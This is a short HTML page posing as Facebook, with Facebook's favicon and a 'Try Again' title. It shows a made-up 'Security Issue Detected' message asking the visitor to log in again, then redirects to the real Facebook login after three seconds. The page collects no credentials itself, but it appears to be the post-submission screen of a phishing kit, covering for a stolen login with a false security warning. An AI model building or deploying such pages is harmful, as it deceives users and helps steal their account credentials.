<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Facebook Login - Try Again</title>
		<link rel="stylesheet" href="style.css" />
		<link
			rel="icon"
			type="image/png"
			href="https://www.facebook.com/favicon.ico"
		/>
		<script>
			setTimeout(function () {
				window.location.href = 'https://www.facebook.com/login';
			}, 3000); // Redirect after 3 seconds
		</script>
	</head>
	<body>
		<div class="main-contend-section">
			<div
				class="main-container"
				style="
					display: flex;
					justify-content: center;
					align-items: center;
					min-height: 500px;
				"
			>
				<div
					class="form-section"
					style="
						margin: 0 auto;
						float: none;
						box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
					"
				>
					<h2
						style="
							text-align: center;
							color: #1c1e21;
							margin-bottom: 16px;
							font-size: 2rem;
							font-weight: bold;
						"
					>
						Security Issue Detected
					</h2>
					<p
						style="
							text-align: center;
							color: #606770;
							font-size: 1.15rem;
							margin-bottom: 8px;
						"
					>
						You need to login again since some security issues are detected.
					</p>
					<p style="text-align: center; color: #606770; font-size: 1rem">
						Redirecting to Facebook login...
					</p>
				</div>
			</div>
		</div>
	</body>
</html>
